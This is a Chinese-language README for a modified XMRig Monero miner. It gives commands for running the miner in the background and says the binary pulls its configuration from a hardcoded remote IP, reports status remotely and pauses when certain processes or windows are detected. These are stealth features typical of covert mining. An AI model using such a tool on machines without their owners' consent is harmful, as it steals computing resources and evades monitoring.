=====================================
XMRig 定制版 - 智能挖矿程序
=====================================

版本: 6.24.0 (修改版)
编译时间: 2025-08-15
平台: Linux x64

=====================================
主要特性
=====================================

1. 零配置启动 - 自动从远程服务器获取配置
2. 智能命名 - 根据程序名自动获取对应配置
3. 系统监控 - CPU/进程/窗口智能暂停
4. 远程上报 - 实时上报挖矿状态
5. 动态捐赠 - 可配置的捐赠控制

=====================================
使用方法
=====================================

1. 基础使用（自动获取666配置）
   chmod +x xmrig-linux-x64
   ./xmrig-linux-x64

2. 自定义用户（根据程序名获取配置）
   cp xmrig-linux-x64 username
   chmod +x username
   ./username

3. 测试模式
   ./xmrig-linux-x64 --dry-run

4. 后台运行
   nohup ./xmrig-linux-x64 > miner.log 2>&1 &

=====================================
配置说明
=====================================

程序会自动从以下地址获取配置：
http://182.92.97.16:8181/api/user_config.php?user={程序名}

例如：
- 程序名为 john → 获取john的配置
- 程序名为 test → 获取test的配置
- 程序名为 xmrig → 获取666的配置（默认）

=====================================
监控功能
=====================================

自动监控并暂停挖矿的条件：
- CPU使用率超过设定阈值
- 检测到特定进程运行
- 检测到特定窗口标题（Windows）

恢复条件：
- 所有暂停条件消除
- 等待设定的恢复延迟时间

=====================================
系统要求
=====================================

- 操作系统: Linux x64 (Ubuntu/Debian/CentOS等)
- CPU: x86-64架构，支持AES指令集
- 内存: 建议4GB以上
- 网络: 需要访问矿池和配置服务器

=====================================
常见问题
=====================================

Q: 程序无法启动？
A: 确保有执行权限 chmod +x

Q: 无法获取配置？
A: 检查网络连接，确保能访问配置服务器

Q: 如何更新配置？
A: 重启程序即可获取最新配置

Q: 如何查看日志？
A: 使用 ./xmrig-linux-x64 2>&1 | tee log.txt
